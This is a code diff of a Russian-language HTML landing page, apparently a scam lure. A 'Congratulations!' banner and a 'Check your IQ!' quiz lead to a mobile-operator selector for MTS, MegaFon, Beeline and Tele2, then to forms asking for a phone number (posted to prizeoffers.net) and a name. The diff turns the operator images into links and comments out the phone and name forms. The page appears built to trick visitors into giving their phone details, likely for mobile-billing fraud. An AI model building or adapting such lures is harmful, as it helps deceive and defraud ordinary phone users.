@@ -8,7 +8,7 @@
 
     <title>Поздравляем!</title>
 
-   </head>
+</head>
 
 <body>
     <div id="app" class="app">
@@ -43,10 +43,9 @@
             </div>
         </div>
 
-        <div class="modal modal--open">
-            <div data-testid="backdrop" class="modal__backdrop"></div>
-            <div data-testid="content" class="modal__content"
-                style="width: 300px; padding: 30px;">
+        <div class="modal">
+            <div class="modal__backdrop"></div>
+            <div class="modal__content" style="width: 300px; padding: 30px;">
                 <div>
                     <div class="modal__error" style="display: none;"></div>
                     <h1 class="modal__title modal__title--h1">Проверьте свой IQ!</h1>
@@ -62,54 +61,40 @@
                     <div class="modal__cta-title">Проверьте свой балл на IQ:</div>
                     <div class="modal__cta">
                         <div class="operator-selector">
-                            <div data-testid="button-list"
-                                class="operator-button-list operator-selector__list operator-button-list--count4">
+                           
+                            <div class="operator-button-list operator-button-list_count4">
                                 <div class="operator-button-list__container">
-                                    <div title="MTS"
-                                          class="operator-button-list__button"><img
-                                            src="./dis/images/mts.svg"
-                                            class="operator-button-list__image"></div>
-                                    <div title="MegaFon"
-                                        class="operator-button-list__button"><img
-                                            src="./dis/images/megafon.svg"
-                                            class="operator-button-list__image"></div>
-                                    <div title="Beeline"
-                                        class="operator-button-list__button"><img
-                                            src="./dis/images/beeline.svg"
-                                            class="operator-button-list__image"></div>
-                                    <div title="Tele2"
-                                        class="operator-button-list__button"><img
-                                            src="./dis/images/tele2.svg"
-                                            class="operator-button-list__image"></div>
+                                    <a title="MTS" id="mts" class="operator-button-list__button">
+                                        <div></div>
+                                    </a>
+                                    <a title="MegaFon" id="megafon" class="operator-button-list__button"><div></div></a>
+                                    <a title="Beeline" id="beeline" class="operator-button-list__button"><div></div></a>
+                                    <a title="Tele2" id="tele2" class="operator-button-list__button"><div></div></a>
                                 </div>
                             </div>
+
                         </div>
                     </div>
                 </div>
 
-                <div style="display: none;">
+                <!-- <div style="display: none;">
                     <h1 class="modal__title modal__title--h1">
                         Необходима проверка
                     </h1>
 
                     <div class="identification-form">
-                        <form action="https://prizeoffers.net/phonenumber"
-                            data-testid="form"><input name="_token"
-                                value="hIdSROlj7SFRKPz432HDMfmNwOaRjuG90tdjJdeT"> <input data-v-0780db2f=""
-                                type="hidden" name="phone_country" value="RU"> <input type="hidden"
-                                name="lang" value="ru"> <input name="identified"
-                                value="false"> <input value="1"> <label
-                                class="identification-form__label">
+                        <form action="https://prizeoffers.net/phonenumber"><input type="hidden" name="phone_country"
+                                value="RU">
+                            <input type="hidden" name="lang" value="ru"> <input name="identified" value="false"> <input
+                                value="1"> <label class="identification-form__label">
                                 Оставьте свой номер телефона для связи с вами!
                             </label> <label class="input">
                                 <div class="input__prefix">
                                     9
-                                </div> <input data-testid="input"
-                                    data-hj-allow="" class="input__input">
+                                </div> <input data-testid="input" data-hj-allow="" class="input__input">
                             </label>
-                            <div class="button"
-                                style="background-color: rgb(17, 193, 149); color: rgb(255, 255, 255);"><span
-                                    class="button__label">
+                            <div class="button" style="background-color: rgb(17, 193, 149); color: rgb(255, 255, 255);">
+                                <span class="button__label">
                                     Отправить
                                 </span></div>
                         </form>
@@ -122,14 +107,11 @@
                     </h1>
                     <div class="sms-form">
                         <div class="sms-form__label">
-                                Пожалуйста, введите свое имя:
-                            </label> <label data-testid="input"
-                                autofocus="autofocus"
-                                class="input sms-form__input input--text-center"><input data-v-1f772b0e=""
-                                    type="text" placeholder="" data-testid="input" data-hj-allow=""
-                                    class="input__input"></label>
-                            <div id="index"
-                                class="button sms-form__button"
+                            Пожалуйста, введите свое имя:
+                            </label> <label data-testid="input" autofocus="autofocus"
+                                class="input sms-form__input input--text-center"><input data-v-1f772b0e="" type="text"
+                                    placeholder="" data-testid="input" data-hj-allow="" class="input__input"></label>
+                            <div id="index" class="button sms-form__button"
                                 style="background-color: rgb(17, 193, 149); color: rgb(255, 255, 255);"><span
                                     class="button__label">
                                     Продолжить
@@ -146,7 +128,7 @@
                         Спасибо, ваше участие подтверждено.
                         Мы свяжемся с вами.
                     </p>
-                </div>
+                </div> -->
             </div>
         </div>
     </div>
